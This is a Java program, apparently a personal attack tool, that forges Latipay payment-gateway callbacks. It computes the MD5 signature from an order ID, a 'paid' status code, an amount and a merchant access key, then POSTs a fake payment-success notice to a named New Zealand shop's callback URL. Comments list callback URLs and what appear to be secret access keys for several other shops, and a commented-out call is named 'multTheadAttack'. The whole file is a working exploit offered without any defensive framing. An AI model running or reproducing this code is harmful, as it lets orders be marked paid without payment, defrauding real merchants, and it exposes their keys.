package attact.attact;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class App {
//	  $ikey = $this->get_option('access_key'); //秘钥
//
//      $orderId = $_GET['orderId'];
//      $payType = $_GET['payType'];//0网银 1支付宝 2微信
//      $status = $_GET['status'];//支付状态 20 支付成功
//      $currency = $_GET['currency'];//货币币种
//      $amount = $_GET['amount'];//实际收到的金额
//      $md5info = $_GET['md5info'];//订单数字指纹
//
//      $signText = $orderId . $payType . $status . $currency . $amount . $ikey;
//      $sign = md5($signText);
	//http://www.healthelement.co.nz/latipay/payment/response/
	private static final String backUrl ="http://www.healthway.co.nz/laticallback";//"https://www.woliwowai.com/_payment_latipay/return_back.asp";
			//"http://www.post2u.co.nz/pay/latipay_notify.php";
	//"http://www.healthelement.co.nz/latipay/payment/response/";
	//"http://www.tmdshop.co.nz/respondlatipayBack.php";
	//http://www.hyhealth.co.nz/plugins/app/pay_latipay/pay_latipay.server.php
	//http://www.healthway.co.nz/laticallback
	private static final String frontUrl="http://www.healthway.co.nz/success";
			//"http://www.post2u.co.nz/pay/latipay_callback.php";
	//"http://www.tmdshop.co.nz/respondlatipay.php";
	//http://www.hyhealth.co.nz/plugins/app/pay_latipay/pay_latipay.php
	//http://www.healthway.co.nz/success
	private static String access_key="healthway64271";
	//"603966"; //TMDshop
	//123456 //huayang
	//healthway64271
	//123999
	
	//"dasdasedschtr90w3idew";//"post2u";
	//
//	private static String post2u_front="http://www.post2u.co.nz/pay/latipay_callback.php";
//	private static String post2u_back="http://www.post2u.co.nz/pay/latipay_notify.php";
	
	
	private static String orderId="20171126-M00000901-254828";//"20170603-M00000930_0005-94788"; //443851ff6ca8df587379cf265f918487
	
	private static String status="20";
	private static String payType="2";
	private static String currency="CNY";//"NZD";//"CNY";
	private static String amount="1144.36";
	private static String itemName="1";
	private static String md5info=null;
	private static String payCallBack(){
		//md5info=MD5.md5(orderId+payType+status+currency+amount+access_key);
		md5info=MD5.md5(orderId+payType+status+currency+amount+access_key);
		
		
	String reString = null;
	//this.getRandom(this.map);
	// OkHttpClient client = new OkHttpClient();
	OkHttpClient client = new OkHttpClient.Builder().readTimeout(60000, TimeUnit.MILLISECONDS)
			.writeTimeout(60000, TimeUnit.MILLISECONDS).build();

	RequestBody formBody = new FormBody.Builder()
			.add("access_key", access_key)
			.add("orderId", orderId)
			.add("status", status)
			.add("payType", payType)
			.add("currency", currency)
			.add("amount", amount)
			.add("md5info", md5info)
			.add("itemName", itemName)
			.build();
   System.out.println("mdfo:  "+md5info);
	Request request = new Request.Builder().url(backUrl).post(formBody).build();
	

	Response response = null;
	try {

		response = client.newCall(request).execute();

		if (response != null && response.isSuccessful()) {
			// throw new IOException("服务器端错误: " + response);
          System.out.println("this is success");
          System.out.println(response.body().string());
		} else {
			Info.setErrorTimes();
		}
		
		
		if ( response != null && response.code() != 200) {
			System.out.println(Thread.currentThread().getName() + response.code());
			//System.out.println(response.message());
			System.out.println(response.body().string());
			//System.out.println(Info.getErrorTimes() + Info.getN());
		}

	} catch (IOException e) {
		// TODO Auto-generated catch block
		Info.setException();
		// System.out.println("exception
		// :"+Thread.currentThread().getName()+response.code());
		e.printStackTrace();
	}

	finally {
		if (response != null) {

			response.close();
		}
		// response = null;
		formBody = null;
		// client.
		client = null;
	}

	return reString;

}
	public static void main(String[] args) {
		System.out.println("start");


			//Test.multTheadAttack(1, 1);

		App.payCallBack();

			
			System.out.println("end");
		

	}
	

}